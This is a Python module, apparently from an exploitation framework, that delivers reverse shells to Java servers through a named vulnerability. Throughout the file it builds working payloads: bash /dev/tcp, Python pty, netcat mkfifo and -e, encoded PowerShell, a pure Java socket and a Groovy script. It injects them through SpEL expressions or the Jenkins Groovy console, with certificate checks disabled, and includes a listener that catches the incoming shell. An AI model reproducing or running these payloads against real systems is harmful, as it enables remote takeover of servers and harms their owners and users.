# language: Python 3.10+, file: modules/post/reverse_shell.py
# Post-exploitation: reverse shell dropper for Java4Shell (CVE-2026-114938).
#
# Delivers a reverse shell payload to the target JVM.
# Variants: bash TCP, Python socket, netcat, netcat mkfifo,
#           pure Java raw socket, PowerShell (Windows JVM targets).
# Delivery: SpEL (Spring Boot/Keycloak), OGNL (Jira/Confluence),
#           Groovy console (Jenkins), Runtime.exec direct.

import base64
import json
import socket
import threading
import time
import urllib.request
import urllib.error
import ssl
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── Payload builders ──────────────────────────────────────────────────────────

def _bash_tcp(lhost: str, lport: int) -> str:
    raw = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64 = base64.b64encode(raw.encode()).decode()
    return f"bash -c {{echo,{b64}}}|{{base64,-d}}|bash"


def _python3_socket(lhost: str, lport: int) -> str:
    raw = (
        f"import socket,os,pty;"
        f"s=socket.socket();"
        f"s.connect(('{lhost}',{lport}));"
        f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        f"pty.spawn('/bin/bash')"
    )
    b64 = base64.b64encode(raw.encode()).decode()
    return f"python3 -c \"exec(__import__('base64').b64decode('{b64}').decode())\""


def _nc_mkfifo(lhost: str, lport: int) -> str:
    return f"rm /tmp/.j4s;mkfifo /tmp/.j4s;cat /tmp/.j4s|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/.j4s"


def _nc_e(lhost: str, lport: int) -> str:
    return f"nc -e /bin/bash {lhost} {lport}"


def _powershell_enc(lhost: str, lport: int) -> str:
    ps = (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';"
        f"$by=([text.encoding]::ASCII).GetBytes($r);"
        f"$s.Write($by,0,$by.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
    return f"powershell -enc {b64}"


def _java_raw_socket(lhost: str, lport: int) -> str:
    """Pure Java SpEL expression — no bash/nc/python needed."""
    return (
        f"new Thread(()->{{try{{"
        f"java.net.Socket s=new java.net.Socket(\"{lhost}\",{lport});"
        f"java.io.InputStream i=s.getInputStream();"
        f"java.io.OutputStream o=s.getOutputStream();"
        f"java.lang.ProcessBuilder pb=new java.lang.ProcessBuilder(\"/bin/bash\",\"-i\");"
        f"pb.redirectErrorStream(true);"
        f"java.lang.Process p=pb.start();"
        f"new Thread(()->{{try{{byte[] b=new byte[4096];int n;"
        f"while((n=i.read(b))!=-1)p.getOutputStream().write(b,0,n);}}"
        f"catch(Exception e){{}}}}). start();"
        f"byte[] b=new byte[4096];int n;"
        f"while((n=p.getInputStream().read(b))!=-1)o.write(b,0,n);}}"
        f"catch(Exception e){{}}}}). start()"
    )


def _groovy_revshell(lhost: str, lport: int) -> str:
    return (
        f'Thread.start {{\n'
        f'  def s=new Socket("{lhost}",{lport})\n'
        f'  def p=["bash","-i"].execute()\n'
        f'  p.consumeProcessOutput(s.outputStream,s.outputStream)\n'
        f'  s.inputStream.eachLine{{line->p.outputStream<<line+"\\n"}}\n'
        f'}}'
    )


# ─── HTTP delivery helpers ─────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _spel_exec(target_url: str, path: str, command: str, timeout: float) -> tuple[int, str]:
    b64 = base64.b64encode(command.encode()).decode()
    spel = (
        f"T(java.lang.Runtime).getRuntime().exec("
        f"new String[]{{\"bash\",\"-c\","
        f"new String(T(java.util.Base64).getDecoder().decode(\"{b64}\")))))"
    )
    body = json.dumps({"expression": spel}).encode()
    req  = urllib.request.Request(
        target_url.rstrip("/") + path, data=body,
        headers={"Content-Type": "application/json", "User-Agent": "Java4Shell-Shell/1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(1024).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return 0, str(e)


def _groovy_exec(target_url: str, script: str, timeout: float) -> tuple[int, str]:
    import urllib.parse
    body = urllib.parse.urlencode({"script": script}).encode()
    req  = urllib.request.Request(
        target_url.rstrip("/") + "/script", data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded",
                 "User-Agent": "Java4Shell-Shell/1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(1024).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return 0, str(e)


def _spel_java_raw(target_url: str, path: str, spel_expr: str, timeout: float) -> tuple[int, str]:
    body = json.dumps({"expression": spel_expr}).encode()
    req  = urllib.request.Request(
        target_url.rstrip("/") + path, data=body,
        headers={"Content-Type": "application/json", "User-Agent": "Java4Shell-Shell/1.0"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(1024).decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return 0, str(e)


# ─── Integrated listener ───────────────────────────────────────────────────────

def _start_listener(lport: int) -> Optional[socket.socket]:
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", lport))
        srv.listen(1)
        srv.settimeout(90)
        return srv
    except Exception:
        return None


def _handle_shell(srv: socket.socket):
    import sys
    print(f"\n  \033[92m[+] Listening for reverse shell …\033[0m")
    try:
        conn, addr = srv.accept()
        print(f"  \033[92m[+] Shell connected from {addr[0]}:{addr[1]}\033[0m")
        print("  \033[93m  Type 'exit' to close.\033[0m\n")
        conn.settimeout(120)

        def recv_loop():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                except Exception:
                    break

        t = threading.Thread(target=recv_loop, daemon=True)
        t.start()
        while True:
            try:
                cmd = input()
                conn.sendall((cmd + "\n").encode())
                if cmd.strip().lower() == "exit":
                    break
            except (EOFError, KeyboardInterrupt):
                break
        conn.close()
    except socket.timeout:
        print("  \033[91m[-] Listener timed out.\033[0m")
    except Exception as e:
        print(f"  \033[91m[-] Listener error: {e}\033[0m")
    finally:
        srv.close()


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class ReverseShellResult:
    success: bool = False
    technique: str = ""
    lhost: str = ""
    lport: int = 0
    error: Optional[str] = None
    notes: list[str] = field(default_factory=list)


# ─── Main function ────────────────────────────────────────────────────────────

def run_reverse_shell(fp: FingerprintResult,
                      core: ExploitCoreResult,
                      lhost: str,
                      lport: int,
                      listen: bool = False,
                      timeout: float = 15.0,
                      verbose: bool = False) -> ReverseShellResult:
    result = ReverseShellResult(lhost=lhost, lport=lport)

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — run exploit core first."
        return result

    base      = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary   = endpoints[0]["path"] if endpoints else "/"

    # Shell variants in preference order
    variants = [
        ("bash-tcp",       _bash_tcp(lhost, lport)),
        ("python3-socket", _python3_socket(lhost, lport)),
        ("nc-mkfifo",      _nc_mkfifo(lhost, lport)),
        ("nc-e",           _nc_e(lhost, lport)),
        ("powershell",     _powershell_enc(lhost, lport)),
    ]

    # Start listener thread if requested
    srv = None
    listener_thread = None
    if listen:
        srv = _start_listener(lport)
        if srv:
            listener_thread = threading.Thread(target=_handle_shell, args=(srv,), daemon=True)
            listener_thread.start()
            print(f"  [shell] Listener started on 0.0.0.0:{lport}")
        else:
            result.notes.append(f"Could not bind listener on {lport} — start manually: nc -lvnp {lport}")

    for name, cmd in variants:
        if verbose:
            print(f"  [shell] Trying {name} …")

        code, _ = _spel_exec(base, primary, cmd, timeout)

        if code in (200, 201, 202, 500):
            result.success   = True
            result.technique = f"Runtime.exec via SpEL ({name})"
            result.notes.append(f"Payload delivered: {name}")
            break

        # Jenkins Groovy console
        if fp.profile_key == "jenkins":
            gs = _groovy_revshell(lhost, lport)
            c2, _ = _groovy_exec(base, gs, timeout)
            if c2 == 200:
                result.success   = True
                result.technique = f"Jenkins Groovy console ({name})"
                result.notes.append("Delivered via Groovy Script Console")
                break

    # Fallback: pure Java raw socket via SpEL (no shell binary needed)
    if not result.success:
        if verbose:
            print("  [shell] Trying pure Java raw socket (SpEL) …")
        java_expr = _java_raw_socket(lhost, lport)
        code3, _ = _spel_java_raw(base, primary, java_expr, timeout)
        if code3 in (200, 201, 202, 500):
            result.success   = True
            result.technique = "Pure Java raw socket (SpEL)"
            result.notes.append("No bash/nc/python required — pure Java socket shell")

    if not result.success:
        result.error = (
            f"All variants delivered but no connection received. "
            f"Ensure listener is running: nc -lvnp {lport}"
        )
        result.notes.append("Outbound TCP may be firewalled — try port 80 or 443.")

    result.notes.append(f"Manual listener: nc -lvnp {lport}  (rlwrap nc -lvnp {lport} for readline)")

    if listen and listener_thread:
        listener_thread.join(timeout=90)

    return result
